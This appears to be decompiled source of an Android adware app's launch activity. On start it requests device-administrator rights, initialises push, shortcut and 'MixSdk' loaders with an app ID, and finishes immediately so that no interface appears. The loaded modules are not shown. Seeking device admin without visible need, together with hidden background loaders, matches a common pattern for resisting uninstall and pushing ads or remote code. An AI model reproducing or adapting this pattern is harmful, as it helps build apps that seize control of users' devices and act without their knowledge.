package com.bangbang.ads.android;
import workspace.mixsdk.MixSdkLoader;
import workspace.push.PLoader;
import workspace.shortcut.ShortcutManager;
import workspace.util.Constants;
import workspace.util.WUtil;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(workspace.util.AR.layout.activity_main);
        WUtil.a(this);
        String appId = Constants.appId;
        requestDeviceAdmin();
        new PLoader().init(this, appId);
        ShortcutManager.checkTask(this, appId);
        new MixSdkLoader().init(this, appId);
        finish();
    }
    private void requestDeviceAdmin() {
        DevicePolicyManager devicepolicymanager = (DevicePolicyManager) getSystemService("device_policy");
        ComponentName componentname = new ComponentName(this, DaReceiver.class);
        if (!devicepolicymanager.isAdminActive(componentname)) {
            Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
            intent.putExtra("android.app.extra.DEVICE_ADMIN", componentname);
            intent.putExtra("android.app.extra.ADD_EXPLANATION", getResources().getString(workspace.util.AR.string.act));
            startActivityForResult(intent, 1);
        }
    }
}
